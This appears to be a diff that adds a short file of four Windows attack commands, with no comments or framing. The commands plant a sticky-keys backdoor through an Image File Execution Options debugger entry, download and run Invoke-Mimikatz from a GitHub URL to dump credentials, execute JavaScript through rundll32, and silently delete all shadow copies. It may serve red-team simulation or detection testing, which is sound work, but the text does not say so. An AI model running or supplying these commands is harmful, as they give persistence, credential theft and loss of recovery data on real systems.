@@ -1,0 +1,7 @@
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f
+
+powershell.exe -windowStyle Hidden -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
+
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert("JavaScript");window.close();
+
+vssadmin.exe Delete Shadows /All /Quiet
